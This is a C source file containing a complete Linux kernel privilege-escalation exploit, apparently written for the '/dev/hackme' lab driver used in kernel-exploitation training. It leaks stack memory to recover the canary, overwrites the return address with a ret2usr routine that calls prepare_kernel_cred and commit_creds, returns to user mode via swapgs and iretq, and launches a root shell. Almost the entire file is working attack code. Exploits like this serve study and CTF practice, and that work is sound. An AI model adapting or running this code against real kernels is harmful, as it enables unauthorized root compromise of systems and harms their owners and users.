#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/types.h>

#define CANARY_SIZE 0x8
#define BUF_MAX 0x180
#define CANARY_OFFSET 0x80

int pop_shell(void);

uint64_t g_cs, g_rflags, g_sp, g_ss;
uint64_t g_rip = (uint64_t) pop_shell;
uint64_t g_commit_creds = 0xffffffff814c6410;
uint64_t g_prepare_kernel_cred = 0xffffffff814c67f0;

int dev_open(const char *devname) {
    int fd = open(devname, O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open %s.", devname);
        exit(EXIT_FAILURE);
    }
    return fd;
}

int pop_shell(void) {
    uid_t uid = getuid();
    printf("[+] Shell UID: %u\n", uid);
    if (uid != 0) {
        fprintf(stderr, "[-] Failed to escalate priveleges.");
        return -1;
    }
    system("/bin/sh");
    exit(0);  // Exit pre-emptively to avoid segmentation fault.
}

bool is_canary(uint64_t leak) {
    uint16_t prefix = leak >> 48;
    uint8_t null_byte = leak & 0xff;
    return ((prefix != 0xffff) && (null_byte == 0) && (prefix != 0));
}

uint64_t leak(int fd) {
    size_t   bytes_read  = 0;
    uint64_t canary      = 0;

    int size = BUF_MAX / 8;
    uint64_t leak[size + 10];
    bytes_read = read(fd, leak, BUF_MAX);
    if (bytes_read < 0) {
        fprintf(stderr, "[-] Failed to read.");
        goto LEAK_EXIT;
    }

    printf("[+] Beginning leak:\n");
    printf("\tOffset:\tLeak Data\n");
    /* For whatever reason, the canary appears three times in the leak. Once
       inside the `tmp` variable on the stack (improper initialization?), once
       0x80, again at 0xf0 for a different stack frame. The 0x80 location is
       actual canary location offset
    */
    for (int idx = 0; idx < size; idx++) {
        printf("\t0x%lx:\t0x%016lx", idx * sizeof(canary), leak[idx]);
        if (is_canary(leak[idx])) {
            printf("  CANARY CANDIDATE");
            canary = leak[idx];
        }
        printf("\n");
    }
    printf("[+] Leak complete\n");

LEAK_EXIT:
    return canary;
}

void save_state(void) {
    printf("[+] Saving state...\n");
    __asm__(
        ".intel_syntax noprefix;"
        "mov g_cs, cs;"
        "mov g_ss, ss;"
        "mov g_sp, rsp;"
        "pushf;"
        "pop g_rflags;"
        ".att_syntax;"
    );
    printf("[+] State saved.\n");
}

void priv_esc(void) {
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rax, g_prepare_kernel_cred;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, g_commit_creds;"
        "call rax;"
        "swapgs;"
        "push g_ss;"
        "push g_sp;"
        "push g_rflags;"
        "push g_cs;"
        "push g_rip;"
        "iretq;"
        ".att_syntax;"
    );
}

void exploit(int fd, uint64_t canary) {
    int size = BUF_MAX / 8;
    int idx = CANARY_OFFSET / 8;
    uint64_t payload[size + 1];

    payload[idx] = canary;                  // Canary offset
    payload[idx + 4] = (uint64_t) priv_esc; // RIP offset

    printf("[+] Delivering payload...\n");
    write(fd, payload, sizeof(payload));
}

int main(int argc, char **argv) {
    int      devfd      = 0;
    uint64_t canary     = 0;

    devfd = dev_open("/dev/hackme");
    canary = leak(devfd);
    if (canary == 0) {
        fprintf(stderr, "[-] Failed to leak canary.\n");
        goto EXIT;
    }
    printf("[+] Canary: 0x%016lx\n", canary);
    save_state();
    exploit(devfd, canary);

EXIT:
    close(devfd);
    return 0;
}
